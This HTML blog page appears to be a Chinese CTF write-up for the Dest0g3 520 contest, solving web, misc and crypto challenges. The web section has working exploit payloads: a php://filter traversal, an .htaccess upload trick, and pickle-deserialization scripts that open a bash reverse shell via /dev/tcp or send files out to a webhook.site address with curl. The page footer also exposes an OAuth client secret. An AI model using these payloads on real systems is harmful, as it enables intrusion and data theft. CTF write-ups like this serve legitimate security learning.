<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Dest0g3 520迎新赛 WP - hututu&#039;blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="hututu&#039; blog"><meta name="msapplication-TileImage" content="/img/avatar.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="hututu&#039; blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="忙到比赛快结束了才开始打 *.* WEBphpdestrequire_once 绕过不能重复包含文件的限制 poc如下： 1php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource&amp;#x3D;&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;pro"><meta property="og:type" content="blog"><meta property="og:title" content="Dest0g3 520迎新赛 WP"><meta property="og:url" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/"><meta property="og:site_name" content="hututu&#039;blog"><meta property="og:description" content="忙到比赛快结束了才开始打 *.* WEBphpdestrequire_once 绕过不能重复包含文件的限制 poc如下： 1php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource&amp;#x3D;&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;self&amp;#x2F;root&amp;#x2F;pro"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image1.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image2.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image3.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image4.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image5.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image6.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image7.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image8.jpg"><meta property="og:image" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image9.jpg"><meta property="article:published_time" content="2022-05-31T17:42:31.000Z"><meta property="article:modified_time" content="2024-03-20T12:07:28.483Z"><meta property="article:author" content="hututu"><meta property="article:tag" content="ctf"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image1.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/"},"headline":"Dest0g3 520迎新赛 WP","image":["http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image1.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image2.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image3.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image4.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image5.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image6.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image7.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image8.jpg","http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image9.jpg"],"datePublished":"2022-05-31T17:42:31.000Z","dateModified":"2024-03-20T12:07:28.483Z","author":{"@type":"Person","name":"hututu"},"publisher":{"@type":"Organization","name":"hututu'blog","logo":{"@type":"ImageObject","url":"http://localhost:4000/img/avatar.jpg"}},"description":"忙到比赛快结束了才开始打 *.* WEBphpdestrequire_once 绕过不能重复包含文件的限制 poc如下： 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro"}</script><link rel="canonical" href="http://localhost:4000/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/"><link rel="icon" href="/img/avatar.jpg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link data-pjax rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/11.7.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/avatar.jpg" alt="hututu&#039;blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-05-31T17:42:31.000Z" title="2022/6/1 01:42:31">2022-06-01</time>发表</span><span class="level-item"><time dateTime="2024-03-20T12:07:28.483Z" title="2024/3/20 20:07:28">2024-03-20</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF-WP/">CTF-WP</a></span><span class="level-item">7 分钟读完 (大约1062个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Dest0g3 520迎新赛 WP</h1><div class="content"><p>忙到比赛快结束了才开始打 *.*</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>require_once 绕过不能重复包含文件的限制</p>
<p>poc如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image1.jpg" class="" title="This is an image">

<p><code>flag:Dest0g3&#123;26291723-ac8b-4776-95e6-65be65455960&#125;</code></p>
<p><strong>相关知识点学习</strong>：php源码分析 require_once 绕过不能重复包含文件的限制 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>
<h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image2.jpg" class="" title="This is an image">

<p>字符串拼接出错即可引发错误输出flag，直接发一个数组即可.</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image3.jpg" class="" title="This is an image">

<p><code>flag:Dest0g3&#123;d06f2820-8493-4d29-b470-f265b23b199f&#125;</code></p>
<h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><p>利用十六进制转ASCII绕过system禁用，再用head读取文件</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image4.jpg" class="" title="This is an image">

<p><code>flag:Dest0g3&#123;fb501803-e3af-4a13-8736-a1752ec324c9&#125;</code></p>
<h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><p>限制上传php文件，文件内容无法带有<code>&lt;?php</code>。于是先上传一个eval.jpg文件</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image5.jpg" class="" title="This is an image">

<p>再用 .htaccess 的将其解析为php文件，同时加上<code>php_value auto_prepend_file /flag</code>将flag进来：</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image6.jpg" class="" title="This is an image">

<p>再访问eval.jpg即可看到flag：</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image7.jpg" class="" title="This is an image">

<p><code>flag:Dest0g3&#123;6a131d9c-4c4b-44a5-b040-0264f42966a5&#125;</code></p>
<p>相关知识点学习：与 .htaccess 相关的奇淫技巧 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241147#h3-11">https://www.anquanke.com/post/id/241147#h3-11</a></p>
<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><p>一道简单的Pickle反序列化，看源码利用思路很简单：构造opcode让服务器调用config下的backdoor函数进行远程代码执行。</p>
<p>需要注意这个是无回显的，可以利用反弹shell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">((S&#x27;os.system(&quot;#bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1&#x27;</span></span><br><span class="line"><span class="string">S&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">ltR.&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p=requests.post(url=<span class="string">&quot;http://a109323d-13f4-4417-97d8-0af8e6dbc36c.node4.buuoj.cn:81/home&quot;</span>,data=&#123;<span class="string">&quot;data&quot;</span>: payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(p.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#服务器运行 nc -lnvp 1234</span></span><br></pre></td></tr></table></figure>

<p>比赛的时候因为自己的机子不知道啥原因就是弹不了，也就有了下面这个操作，先用把命令执行结果输出到文件后再把通过curl命令把执行结果发送出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">((S&#x27;os.system(&quot;curl -F \&#x27;ls / &gt; /flag&amp;curl -F \&#x27;file=@/flag\&#x27; https://webhook.site/68149089-5dbe-48b2-a13f-ff9718771340&#x27;</span></span><br><span class="line"><span class="string">S&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">ltR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#file=@/flag.txt\&#x27; https://webhook.site/68149089-5dbe-48b2-a13f-ff9718771340</span></span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p=requests.post(url=<span class="string">&quot;http://a109323d-13f4-4417-97d8-0af8e6dbc36c.node4.buuoj.cn:81/home&quot;</span>,data=&#123;<span class="string">&quot;data&quot;</span>: payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(p.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Dest0g3{a18d0ee5-5bb2-45aa-8d99-89ce75b1f06e}</p>
<p>相关知识点学习：Pickle反序列化 <a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="你知道js吗"><a href="#你知道js吗" class="headerlink" title="你知道js吗"></a>你知道js吗</h2><p>拿到flag，打开可以看到明显是一个word文件，添加.docx后缀打开，将文本文件复制后发现是base64，解码得到其中一串只有+-.&lt;&gt;[]的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br></pre></td></tr></table></figure>

<p>Brainfuck解码得到<code>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code>，十六进制转为字符串即可得到flag。</p>
<p><code>flag: Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code></p>
<h2 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h2><p>附件给的png用binwalk提取可以得到一个加密的压缩包，</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image8.jpg" class="" title="This is an image">

<p>用Stegsolve查看png图片可以发现RGB三个通道最低为存在lsb隐写，提取得到压缩包密码<code>Weak_Pas5w0rd</code>，</p>
<img src="/2022/06/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-WP/image9.jpg" class="" title="This is an image">

<p>解压得到flag。</p>
<p><code>flag: Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;</code></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>yafu直接分解n</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">import gmpy2</span><br><span class="line">e = 65537</span><br><span class="line">n=27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span><br><span class="line">c=14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span><br><span class="line">p1 = 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span><br><span class="line">p2 = 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span><br><span class="line">phi=(p1-1)*(p2-1)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=long_to_bytes(pow(c,d,n))</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p><code>flag: Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;</code></p>
<h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><p>直接解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">c=b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span><br><span class="line">iv=b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span><br><span class="line">key=b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">m = my_aes.decrypt(c)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p><code>flag: Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;</code></p>
<h2 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h2><p>sagemath一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">y = 199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span><br><span class="line">p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span><br><span class="line">g = 19</span><br><span class="line">x = discrete_log(mod(y, p), mod(g, p))</span><br><span class="line">print(hex(x))</span><br></pre></td></tr></table></figure>

<p><code>flag: Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;</code></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Dest0g3 520迎新赛 WP</p><p><a href="http://localhost:4000/2022/06/01/Dest0g3-520迎新赛-WP/">http://localhost:4000/2022/06/01/Dest0g3-520迎新赛-WP/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>hututu</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2022-06-01</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-03-20</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/ctf/">ctf</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/06/01/CISCNCTF2022-%E5%88%9D%E8%B5%9B-WP/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CISCNCTF2022 初赛 WP</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2022/05/07/OAuth-2-0-%E4%B8%80%E7%A7%8D%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"><span class="level-item">OAuth 2.0 一种第三方授权访问机制</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.7.2/gitalk.css"><script src="https://cdnjs.loli.net/ajax/libs/gitalk/1.7.2/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "2f0df7c3420a02fa1f463c2bbef2ab0a",
            repo: "hututu2.github.io",
            owner: "hututu2",
            clientID: "d7042e9d767dec00bcfa",
            clientSecret: "5f92ec6cc40ce20cf0bd5924af68102d10b4de27",
            admin: ["hututu2"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.jpg" alt="hututu"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">hututu</p><p class="is-size-6 is-block">Web Security, CTFer</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Guangdong Province, China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">20</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">4</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/hututu2" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/hututu2"><i class="fab fa-github"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/CTF-WP/"><span class="level-start"><span class="level-item">CTF-WP</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">CTF-复现</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">web笔记</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time 